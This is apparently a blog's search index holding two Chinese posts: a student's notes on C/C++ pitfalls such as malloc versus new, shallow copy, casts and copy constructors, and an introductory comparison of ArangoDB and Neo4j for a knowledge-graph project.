<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C/C++重难点</title>
    <url>/C-C-%E9%87%8D%E9%9A%BE%E7%82%B9.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>实习生面试写代码的时候，由于C、C++混用，出现了不可抗拒的BUG，最终调试失败，面试凉凉。</p>
<p>事后，深感自己C++学得不扎实，又患有C与C++混用的毛病。因此，特开新篇，归纳自己在使用C++过程中，所遇到的重难点。</p>
<span id="more"></span>

<h2 id="1-简单区分-C-与-C"><a href="#1-简单区分-C-与-C" class="headerlink" title="1. 简单区分 C 与 C++"></a>1. 简单区分 C 与 C++</h2><p>记得上C语言课程时，我们都使用devcpp编辑器。但是，devcpp默认的编译器为<code>g++</code>，默认的保存文件格式为<code>.cpp</code>。这导致，我们在学习C语言过程中，就算使用了<code>C++</code>的语法，编译器也不会报错，这是十分糟糕的！</p>
<p>区分 C 与 C++ ，我认为有两个关键点：</p>
<ul>
<li>C 的编译器为 <code>gcc</code> ，C++ 的编译器为 <code>g++</code></li>
<li>C 文件名格式为 <code>.c</code> ，C++ 文件名格式为 <code>.cc</code> 或 <code>.cpp</code></li>
</ul>
<h2 id="2-对比-C-与-C-中的-struct"><a href="#2-对比-C-与-C-中的-struct" class="headerlink" title="2. 对比 C 与 C++ 中的 struct"></a>2. 对比 C 与 C++ 中的 struct</h2><p>为了让C语言开发者们适应，C++故意保留了关键字<code>struct</code>。但是，C++中的<code>struct</code>再也不是昔日的<code>struct</code>了！</p>
<h3 id="2-1-struct-in-C"><a href="#2-1-struct-in-C" class="headerlink" title="2.1. struct in C"></a>2.1. struct in C</h3><p>C语言中的<code>struct</code>：</p>
<ul>
<li>只能包含变量</li>
<li>不能包含函数，但是，可以包含函数指针(其实也是一种变量)</li>
<li>使用<code>malloc()</code>和<code>free()</code>函数，在堆上动态分配、释放内存空间</li>
</ul>
<p>示例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">My_Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">My_Sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="type">int</span>(*Add) (<span class="type">int</span>, <span class="type">int</span>); <span class="comment">// 函数指针</span></span><br><span class="line">    <span class="type">int</span>(*Sub) (<span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line">&#125; CTest;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    CTest test;</span><br><span class="line">    test.data = <span class="number">0</span>;</span><br><span class="line">    test.Add = My_Add;</span><br><span class="line">    test.Sub = My_Sub;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, test.Add(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    CTest *test_p = (CTest*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CTest));</span><br><span class="line">    test_p-&gt;data = <span class="number">1</span>;</span><br><span class="line">    test_p-&gt;Add = My_Add;</span><br><span class="line">    test_p-&gt;Sub = My_Sub;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, test_p-&gt;Add(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-struct-in-C"><a href="#2-2-struct-in-C" class="headerlink" title="2.2. struct in C++"></a>2.2. struct in C++</h3><p>而，C++中的<code>struct</code>，其实就是<code>class</code>的简约版，包含大部分<code>class</code>的特性：</p>
<ul>
<li>既能包含变量，又能包含函数</li>
<li>支持运算符重载</li>
<li>可以使用访问修饰符：<code>privat</code>, <code>protected</code>, <code>public</code></li>
<li>可以有构造函数和析构函数</li>
<li>可以继承与被继承</li>
<li>使用<code>new</code>、<code>delete</code>关键字创建、释放堆上的内存空间</li>
<li>可以包含虚函数</li>
<li>等等等等。。。</li>
</ul>
<p>但要说区别的话，<code>struct</code>与<code>class</code>主要有以下几点区别：</p>
<ol>
<li>默认的继承访问权限不同。struct默认是public继承(父类的public和protected，依旧是子类的public和protected)，class默认是private继承(父类的public和protected，将成为子类的private)。</li>
<li>默认的访问控制权限不同。<strong>struct默认是public成员，class默认是private成员</strong>。</li>
<li>class关键字能用于定义模板参数，但是struct不能。</li>
</ol>
<p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CPP_Struct1</span> &#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与 class CPP_Struct2 简直一样</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CPP_Strcut2</span> &#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="built_in">CPP_Strcut2</span>(<span class="type">int</span> a):<span class="built_in">data</span>(a) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;data:%d\n&quot;</span>, <span class="keyword">this</span>-&gt;data); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重载运算符，const &#123;&#125; 表示函数不会修改自身属性</span></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> CPP_Strcut2 &amp;a) <span class="type">const</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 虚函数</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">virtual_test</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;virtual in struct&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 无构造函数</span></span><br><span class="line">    CPP_Struct1 test1; <span class="comment">// 等价于:CPP_Struct1 test1 = CPP_Struct1 test1()。调用默认构造函数，分配在栈上</span></span><br><span class="line">    test1.data = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, test1.data);</span><br><span class="line"></span><br><span class="line">    CPP_Struct1 test1_1&#123;<span class="number">1</span>&#125;; <span class="comment">// 无构造函数时，可以这样操作</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, test1_1.data);</span><br><span class="line"></span><br><span class="line">    CPP_Struct1 *test1_p = <span class="keyword">new</span> CPP_Struct1; <span class="comment">// 调用默认构造函数，分配在堆上</span></span><br><span class="line">    test1_p-&gt;data = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, test1_p-&gt;data);</span><br><span class="line">    <span class="keyword">delete</span> test1_p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有构造函数</span></span><br><span class="line">    <span class="function">CPP_Strcut2 <span class="title">test2</span><span class="params">(<span class="number">1</span>)</span></span>; <span class="comment">// 隐式地调用构造函数，等价于：CPP_Strcut2 test2 = CPP_Strcut2(1)。分配在栈上</span></span><br><span class="line">    test2.<span class="built_in">print</span>();</span><br><span class="line">    test2.<span class="built_in">virtual_test</span>();</span><br><span class="line"></span><br><span class="line">    CPP_Strcut2 *test2_p = <span class="keyword">new</span> <span class="built_in">CPP_Strcut2</span>(<span class="number">2</span>); <span class="comment">// 分配在堆上</span></span><br><span class="line">    test2_p-&gt;<span class="built_in">print</span>();</span><br><span class="line">    test2_p-&gt;<span class="built_in">virtual_test</span>();</span><br><span class="line">    <span class="keyword">delete</span> test2_p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-3-一定要在-C-中使用-new-创建-struct"><a href="#2-3-一定要在-C-中使用-new-创建-struct" class="headerlink" title="2.3. 一定要在 C++ 中使用 new 创建 struct"></a>2.3. 一定要在 C++ 中使用 new 创建 struct</h3><p>有C语言使用习惯的人，总喜欢用<code>malloc()</code>函数来为<code>struct</code>分配堆空间。</p>
<p><strong>但要特别注意的是：在C++中，一定要使用<code>new</code>来为<code>struct</code>分配堆空间，而不要使用<code>malloc()</code>函数！！！因为，<code>malloc()</code>函数不会调用构造函数！！！</strong></p>
<p>有小伙伴可能会说，那在<code>struct</code>中不定义构造函数不就行了？</p>
<p>但问题是，C++中的<code>struct</code>就相当于<code>class</code>类。而你有可能在<code>struct</code>中<strong>定义了其它类的成员对象</strong>。如果，你在创建<code>struct</code>时，不调用构造函数。那么，成员对象的构造函数将不会被调用，成员对象的创建将出现不可抗拒的BUG！</p>
<p>鄙人面试之时，就是因为这个问题而凉透的。</p>
<p>心痛示例：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="type">int</span> time;</span><br><span class="line">&#125; Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> sum_count;</span><br><span class="line">    queue&lt;Data&gt; q;</span><br><span class="line">&#125; Window;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ok\n&quot;</span>);</span><br><span class="line">    Window *p = (Window*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Window));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ok\n&quot;</span>);</span><br><span class="line">    p-&gt;q.<span class="built_in">push</span>(Data&#123;<span class="number">1</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ok\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count:%d, time:%d\n&quot;</span>, p-&gt;q.<span class="built_in">back</span>().count, p-&gt;q.<span class="built_in">back</span>().time);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后输出（MinGW-W64 g++ 8.1.0）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ok</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>

<p>没错，就是这么奇怪的输出。其中原因，我猜是使用<code>malloc</code>创建<code>Window</code>变量时，没有调用<code>queue&lt;Data&gt; q</code>成员对象的构造函数，导致<code>queue&lt;Data&gt; q</code>没有创建成功，使用过程时出现不可抗拒的BUG。</p>
<h3 id="2-4-C-中什么时候使用-struct-什么时候使用-class"><a href="#2-4-C-中什么时候使用-struct-什么时候使用-class" class="headerlink" title="2.4. C++ 中什么时候使用 struct 什么时候使用 class"></a>2.4. C++ 中什么时候使用 struct 什么时候使用 class</h3><ul>
<li>当解决简单问题，选择轻量级的 struct</li>
<li>当解决复杂问题，需使用抽象思维时，选择 class</li>
</ul>
<h2 id="3-浅拷贝"><a href="#3-浅拷贝" class="headerlink" title="3. 浅拷贝"></a>3. 浅拷贝</h2><p>浅拷贝是指：如果拷贝对象中存在指针类型成员变量，那么会将 <strong>旧对象的指针成员变量</strong> 直接赋值给 <strong>新对象的指针成员变量</strong> ，导致新旧对象的指针成员变量都指向同一块内存区域。</p>
<p>STL 中的各种 push 函数，都是浅拷贝。</p>
<p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="built_in">Person</span>(<span class="type">char</span> *name, <span class="type">int</span> age): <span class="built_in">age</span>(age) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(name) + <span class="number">1</span>];    <span class="comment">// 在堆上创建</span></span><br><span class="line">        <span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;name, name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;name:%s, age:%d\n&quot;</span>, name, age);</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Person</span>() &#123;</span><br><span class="line">        <span class="keyword">delete</span>[] name;  <span class="comment">// new [] 一定要用 delete [] 释放</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(vector&lt;Person&gt; &amp;v)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">10</span>] = <span class="string">&quot;jerry&quot;</span>;    <span class="comment">// 在栈上创建</span></span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="built_in">Person</span>(name, <span class="number">19</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;Person&gt; v;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *name = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">10</span>];  <span class="comment">// 在堆上创建</span></span><br><span class="line">    <span class="built_in">sscanf</span>(<span class="string">&quot;tome&quot;</span>, <span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="built_in">Person</span>(name, <span class="number">18</span>));</span><br><span class="line">    v[<span class="number">0</span>].<span class="built_in">print</span>();</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">    v[<span class="number">0</span>].<span class="built_in">print</span>();</span><br><span class="line"></span><br><span class="line">    v.<span class="built_in">clear</span>();</span><br><span class="line">    <span class="built_in">add</span>(v);</span><br><span class="line">    v[<span class="number">0</span>].<span class="built_in">print</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">name:tome, age:18</span><br><span class="line">name:dome, age:18</span><br><span class="line">name:, age:19</span><br></pre></td></tr></table></figure>

<p>如果，拷贝对象的指针成员变量指向<strong>堆上的内存空间</strong>，那么，只要不在新对象外部修改堆上的内存空间，就算小隐患；</p>
<p>如果，拷贝对象的指针成员变量指向<strong>栈上的内存空间</strong>，一旦栈空间被释放，那将是大大的隐患。</p>
<p>解决浅拷贝问题，则需要定义<strong>拷贝构造函数</strong>，在该函数中，进行<strong>深拷贝</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="built_in">Person</span>(<span class="type">char</span> *name, <span class="type">int</span> age): <span class="built_in">age</span>(age) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(name) + <span class="number">1</span>];    <span class="comment">// 在堆上创建</span></span><br><span class="line">        <span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;name, name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拷贝构造函数，用于解决浅拷贝的问题</span></span><br><span class="line">    <span class="built_in">Person</span>(<span class="type">const</span> Person &amp;p) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(p.name) + <span class="number">1</span>];  <span class="comment">// 深拷贝</span></span><br><span class="line">        <span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;name, p.name);</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = p.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;name:%s, age:%d\n&quot;</span>, name, age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 析构函数</span></span><br><span class="line">    ~<span class="built_in">Person</span>() &#123;</span><br><span class="line">        <span class="keyword">delete</span>[] name;  <span class="comment">// new [] 一定要用 delete [] 释放</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="4-delete-只能释放-new-申请的空间"><a href="#4-delete-只能释放-new-申请的空间" class="headerlink" title="4. delete [] 只能释放 new [] 申请的空间"></a>4. delete [] 只能释放 new [] 申请的空间</h2><p><code>delete []</code>必须与<code>new []</code>搭配使用：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *name = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">10</span>];</span><br><span class="line">...</span><br><span class="line"><span class="keyword">delete</span> [] name;</span><br></pre></td></tr></table></figure>

<p>千万不可：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> name[<span class="number">10</span>] = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">delete</span> [] name;</span><br></pre></td></tr></table></figure>

<h2 id="5-虚函数"><a href="#5-虚函数" class="headerlink" title="5. 虚函数"></a>5. 虚函数</h2><p>参考我的另一篇博客：<a href="./%E7%90%86%E8%A7%A3C++%E8%99%9A%E5%87%BD%E6%95%B0.html">理解C++虚函数</a></p>
<h2 id="6-inline-和-define-的区别"><a href="#6-inline-和-define-的区别" class="headerlink" title="6. inline 和 #define 的区别"></a>6. inline 和 #define 的区别</h2><p><a href="https://www.cnblogs.com/iloveyoucc/archive/2012/03/18/2404658.html">参考博客</a></p>
<p><code>#define</code>宏定义表达式的例子如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> Expression(Var1,Var2) (Var1+Var2)*(Var1-Var2)</span></span><br></pre></td></tr></table></figure>

<p>这种表达式形式宏形式与作用跟函数类似，但它使用预编译器，没有堆栈，使用上比函数高效。<strong>但它只是预编译器上符号表的简单替换，不能进行参数有效性检测及使用C++类的成员访问控制（public等）。</strong></p>
<p>改为<code>inline</code>定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">Expression</span><span class="params">(<span class="type">int</span> Var1, <span class="type">int</span> Var2)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (Var1+Var2)*(Var1-Var2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>inline</code>推出的目的，也正是为了取代这种表达式形式的宏定义。它保持了宏定义的优点，预编译时进行替换，高效。同时，它又是个真正的函数，调用时有严格的参数检测。它也可作为类的成员函数。</p>
<h2 id="7-const-指针-和-指向-const-指针"><a href="#7-const-指针-和-指向-const-指针" class="headerlink" title="7. const 指针 和 指向 const 指针"></a>7. const 指针 和 指向 const 指针</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> *p;   <span class="comment">// 指向 const 的指针</span></span><br><span class="line"><span class="type">int</span> *<span class="type">const</span> p;   <span class="comment">// const 指针</span></span><br></pre></td></tr></table></figure>

<h2 id="8-拷贝构造函数"><a href="#8-拷贝构造函数" class="headerlink" title="8. 拷贝构造函数"></a>8. 拷贝构造函数</h2><p>拷贝构造函数是一种特殊的构造函数，它的<strong>参数必须是本类型的一个引用变量</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> &#123;</span></span><br><span class="line">    Example(<span class="type">const</span> Example &amp;e) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果参数不是引用变量，则调用时会陷入死循环（<strong>实参赋值到形参时，也会调用拷贝构造函数</strong>）。</p>
<h2 id="9-static-cast-和-dynamic-cast"><a href="#9-static-cast-和-dynamic-cast" class="headerlink" title="9. static_cast 和 dynamic_cast"></a>9. static_cast 和 dynamic_cast</h2><p>C 语言的类型转换：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// (type)expr</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">double</span> b = (<span class="type">double</span>)i;</span><br></pre></td></tr></table></figure>

<p>现代 C++ 语言的类型转换：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cast-name&lt;type&gt;(expr)</span></span><br></pre></td></tr></table></figure>

<p><code>cast-name</code> 主要有如下几种：</p>
<ul>
<li><code>static_cast</code> Used for conversion of nonpolymorphic(非多态) types.</li>
<li><code>dynamic_cast</code> Used for conversion of polymorphic types.</li>
<li><code>const_cast</code> Used to remove the const, volatile, and __unaligned attributes.</li>
<li><code>reinterpret_cast</code> Used for simple reinterpretation of bits.</li>
</ul>
<p>其中，<code>static_cast</code> 格式如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// static_cast&lt;type&gt;(expr)</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">double</span> b = <span class="built_in">static_cast</span>&lt;<span class="type">double</span>&gt;(i);</span><br></pre></td></tr></table></figure>

<ul>
<li>用于非多态类型的转换</li>
<li>不执行运行时类型检查（转换安全性不如 dynamic_cast）</li>
<li>通常用于转换数值数据类型（如 float -&gt; int）</li>
<li>可以在整个类层次结构中移动指针，子类转化为父类安全（向上转换），父类转化为子类不安全（因为子类中可能包含父类中没有的字段或方法）</li>
</ul>
<p><code>dynamic_cast</code> ：</p>
<ul>
<li>用于多态类型（基类有虚函数）的转换</li>
<li>运行时进行类型检查</li>
<li>只适用于指针或引用</li>
<li>对不明确的指针的转换将失败（返回 nullptr），但不引发异常</li>
<li>可以在整个类层次结构中移动指针，包括向上转换（子类转为基类）、向下转换（基类转换为子类，具有类型检查的功能，比static_cast更安全）</li>
</ul>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>程序设计语言</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>ArangoDB入门</title>
    <url>/ArangoDB%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>毕业设计选到一个知识图谱相关的课题。</p>
<p>而知识图谱中的一个关键问题就是：数据存储方式。</p>
<span id="more"></span>

<h2 id="1-图数据库选型"><a href="#1-图数据库选型" class="headerlink" title="1. 图数据库选型"></a>1. 图数据库选型</h2><p>传统的知识图谱存储方式有以下三大类：</p>
<ul>
<li>关系型数据库。成熟稳定、使用广泛、文档丰富，但并不擅长处理复杂“关系”。</li>
<li>RDF 三元组存储。由 W3C 制定的标准，具有强大的语义表达能力，但空间开销大、更新维护代价大。</li>
<li>图数据库。与知识图谱结构天然匹配，关系查询性能高，但数据更新复杂，大节点处理开销高。</li>
</ul>
<p>对于关系型数据库与图数据库的关系查询性能对比，《Neo4j in Action》书中做过一项实验：在一个有1000000个人、每个人有50个朋友的庞大社交关系网中，分别用 MySQL 和 Neo4j 查询深度2~5的朋友的朋友，其结果如下：</p>
<p><img src="/ArangoDB%E5%85%A5%E9%97%A8/1.png" alt="1"><br><img src="/ArangoDB%E5%85%A5%E9%97%A8/2.png" alt="2"></p>
<p>由此可见，关系型数据库在解决复杂关系查询时，相当无力。</p>
<p>而结合毕设的实际情况，将采用图数据库为主的存储方式。</p>
<p>当下主流的图数据库如下（<a href="https://db-engines.com/en/ranking_trend/graph+dbms">参考网站</a>）：</p>
<p><img src="/ArangoDB%E5%85%A5%E9%97%A8/3.png" alt="2"></p>
<p>而由于时间和精力有限，将主要调研对比 <code>Neo4j</code> 和 <code>ArangoDB</code> 两种图数据库。</p>
<table>
<thead>
<tr>
<th></th>
<th>Neo4j</th>
<th>ArangoDB</th>
</tr>
</thead>
<tbody><tr>
<td>数据库类型</td>
<td>图数据库</td>
<td>多模数据库</td>
</tr>
<tr>
<td>相关网址</td>
<td><a href="https://neo4j.com/">官网</a>、<a href="https://neo4j.com/docs/">官方文档</a></td>
<td><a href="https://www.arangodb.com/">官网</a>、<a href="https://www.arangodb.com/documentation/">官方文档</a></td>
</tr>
<tr>
<td>目前排名</td>
<td>第一</td>
<td>第四</td>
</tr>
<tr>
<td>主要实现语言</td>
<td>Java</td>
<td>C++</td>
</tr>
<tr>
<td>生态</td>
<td>起步较早，社区活跃，文档丰富，使用体验较好</td>
<td>社区较活跃、文档较非富，使用体验略差</td>
</tr>
<tr>
<td>存储系统</td>
<td>原生图结构</td>
<td>RockDB</td>
</tr>
<tr>
<td>存储模式</td>
<td>仅支持图存储模式</td>
<td>支持键值对、文档、图存储模式，可混合使用</td>
</tr>
<tr>
<td>查询语言</td>
<td>Cypher</td>
<td>AQL</td>
</tr>
<tr>
<td>收费情况</td>
<td>商业版需付费使用，社区版功能限制较多，比如仅支持十亿级数据存储、单机存储等，见<a href="https://neo4j.com/docs/operations-manual/current/introduction/">官网社区版与商业版对比</a></td>
<td>商业版需付费使用，但社区版功能已足够非富</td>
</tr>
<tr>
<td>开源情况</td>
<td>社区版开源</td>
<td>开源</td>
</tr>
<tr>
<td>事务</td>
<td>ACID</td>
<td>ACID</td>
</tr>
<tr>
<td>性能（参考：1. <a href="https://www.jianshu.com/p/38b70768380c">ArangoDB、Neo4j、OrientDB单机性能比较</a>；2. <a href="https://discuss.nebula-graph.com.cn/t/topic/1466/1">Nebula 与 Neo4j、ArangoDB 等图数据库的 Benchmark</a>）</td>
<td>数据导入性能较优，查询性能略差，深度查询性能较差</td>
<td>数据导入性能较差，查询性能略优，深度查询性能较优</td>
</tr>
</tbody></table>
<p>结合上述对比，Neo4j 有着更棒的生态、更好的使用体验。但社区版对数据规模和单机存储的限制，是其严重的缺陷。</p>
<p>而 ArangoDB 虽然生态和体验稍差，但查询性能较优，功能限制少。同时，支持多种存储模式，可简化技术栈。</p>
<h2 id="2-ArangoDB-基本概念"><a href="#2-ArangoDB-基本概念" class="headerlink" title="2. ArangoDB 基本概念"></a>2. ArangoDB 基本概念</h2><p>参考：<a href="https://www.arangodb.com/docs/stable/getting-started.html">ArangoDB Getting Started</a></p>
<p>在 ArangoDB 中，有 <code>Database</code>、<code>Collection</code>、<code>Document</code> 三类基本概念。Database 是 Collection 的集合，Collection 中存储着数据记录，数据记录也就是 Document。</p>
<p>对比关系数据库：</p>
<ul>
<li><p><code>Database</code> 与关系数据库中的数据库概念、作用相同，用于权限控制、界限划分，ArangoDB 中默认的 Database 称为 <code>_system</code>；</p>
</li>
<li><p><code>Collection</code> 相当于关系数据库中的<strong>表</strong>；</p>
</li>
<li><p><code>Document</code> 则相当于表中的<strong>行</strong>，但不同于关系数据库，Document 中列不固定，每个 Document 都包含着随机的任意数量的键值对。每个 Document 都有一个默认属性 <code>_key</code> ，它是独一无二的、不可更改的、可自动生成的，Document 还有另一个默认属性 <code>_id</code> ，它等于 <code>&lt;collection name&gt;/&lt;document _key&gt;</code>。</p>
</li>
</ul>
<p>ArangoDB 提供网页可视化界面，如下是在 <code>test</code> 数据库中创建的 <code>user</code> 集合。</p>
